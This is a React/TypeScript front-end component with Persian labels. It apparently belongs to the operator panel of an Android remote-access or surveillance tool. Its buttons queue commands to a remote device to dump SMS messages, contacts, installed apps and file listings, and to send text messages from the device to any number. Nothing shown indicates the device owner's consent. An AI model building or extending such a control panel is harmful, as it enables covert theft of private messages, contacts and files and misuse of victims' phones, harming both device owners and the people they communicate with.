import React, { useState } from 'react';
import { Box, Button, TextField, Dialog, DialogTitle, DialogContent, DialogActions, Stack, Tooltip } from '@mui/material';
import SmsIcon from '@mui/icons-material/Sms';
import ContactsIcon from '@mui/icons-material/Contacts';
import AppsIcon from '@mui/icons-material/Apps';
import FolderIcon from '@mui/icons-material/Folder';
import SendIcon from '@mui/icons-material/Send';
import { devicesAPI } from '../services/api';

export interface CommandPanelProps {
  deviceId: number;
  onSent?: (commandType: string) => void;
  disabled?: boolean;
}

const CommandPanel: React.FC<CommandPanelProps> = ({ deviceId, onSent, disabled }) => {
  const [filesPath, setFilesPath] = useState<string>('');
  const [smsOpen, setSmsOpen] = useState<boolean>(false);
  const [smsNumber, setSmsNumber] = useState<string>('');
  const [smsMessage, setSmsMessage] = useState<string>('');
  const [submitting, setSubmitting] = useState<boolean>(false);

  const sendCommand = async (command_type: string, command_data: any = {}) => {
    setSubmitting(true);
    try {
      await devicesAPI.createCommand(deviceId, {
        command_type,
        command_data,
        priority: 'normal',
      });
      onSent?.(command_type);
    } finally {
      setSubmitting(false);
    }
  };

  return (
    <Box>
      <Stack direction={{ xs: 'column', sm: 'row' }} spacing={1} alignItems="center" flexWrap="wrap">
        <Tooltip title="دریافت پیامک‌ها">
          <span>
            <Button size="small" variant="outlined" startIcon={<SmsIcon />} disabled={disabled || submitting}
              onClick={() => sendCommand('GET_SMS')}>GET_SMS</Button>
          </span>
        </Tooltip>
        <Tooltip title="دریافت مخاطبین">
          <span>
            <Button size="small" variant="outlined" startIcon={<ContactsIcon />} disabled={disabled || submitting}
              onClick={() => sendCommand('GET_CONTACTS')}>GET_CONTACTS</Button>
          </span>
        </Tooltip>
        <Tooltip title="دریافت برنامه‌های نصب‌شده">
          <span>
            <Button size="small" variant="outlined" startIcon={<AppsIcon />} disabled={disabled || submitting}
              onClick={() => sendCommand('GET_INSTALLED_APPS')}>GET_INSTALLED_APPS</Button>
          </span>
        </Tooltip>
        <Tooltip title="نمایش فایل‌ها در مسیر مشخص">
          <span>
            <TextField size="small" placeholder="/sdcard/" value={filesPath} onChange={(e) => setFilesPath(e.target.value)} sx={{ minWidth: 180 }} />
            <Button size="small" variant="outlined" startIcon={<FolderIcon />} sx={{ ml: 1 }} disabled={disabled || submitting}
              onClick={() => sendCommand('GET_FILES', { path: filesPath || '/' })}>GET_FILES</Button>
          </span>
        </Tooltip>
        <Tooltip title="ارسال پیامک">
          <span>
            <Button size="small" variant="contained" color="secondary" startIcon={<SendIcon />} disabled={disabled || submitting}
              onClick={() => setSmsOpen(true)}>SEND_SMS</Button>
          </span>
        </Tooltip>
      </Stack>

      <Dialog open={smsOpen} onClose={() => setSmsOpen(false)}>
        <DialogTitle>ارسال پیامک</DialogTitle>
        <DialogContent>
          <TextField autoFocus margin="dense" label="شماره" type="tel" fullWidth variant="outlined" value={smsNumber}
            onChange={(e) => setSmsNumber(e.target.value)} />
          <TextField margin="dense" label="متن پیام" multiline minRows={3} fullWidth variant="outlined" value={smsMessage}
            onChange={(e) => setSmsMessage(e.target.value)} />
        </DialogContent>
        <DialogActions>
          <Button onClick={() => setSmsOpen(false)}>انصراف</Button>
          <Button variant="contained" onClick={async () => {
            await sendCommand('SEND_SMS', { number: smsNumber, message: smsMessage });
            setSmsOpen(false);
            setSmsNumber('');
            setSmsMessage('');
          }} disabled={submitting || !smsNumber || !smsMessage}>ارسال</Button>
        </DialogActions>
      </Dialog>
    </Box>
  );
};

export default CommandPanel;
